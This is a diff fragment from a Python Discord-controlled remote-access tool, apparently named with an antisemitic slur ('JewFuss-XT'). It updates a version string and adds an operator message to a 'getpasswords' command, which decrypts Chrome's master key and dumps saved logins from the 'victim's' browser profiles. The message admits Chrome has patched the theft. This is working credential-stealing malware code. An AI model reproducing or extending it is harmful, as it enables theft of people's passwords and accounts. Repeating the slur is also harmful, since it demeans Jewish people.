@@ -42,7 +42,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.3.4" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.3.5" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -990,7 +990,8 @@ async def getpasswords(ctx, max_force_profiles: int = 10):
         try:
             chrome_key = get_master_key(chrome_local_state)
             chrome_output = io.StringIO()
-
+            chrome_output.write("Chrome has patched password stealing, so if the victim has the latest version, this will not work untill I figure it out (I highly doubt I will).\n\n")
+            
             default_login = os.path.join(chrome_base, "Default", "Login Data")
             if os.path.exists(default_login):
                 entries = dump_passwords(default_login, chrome_key)
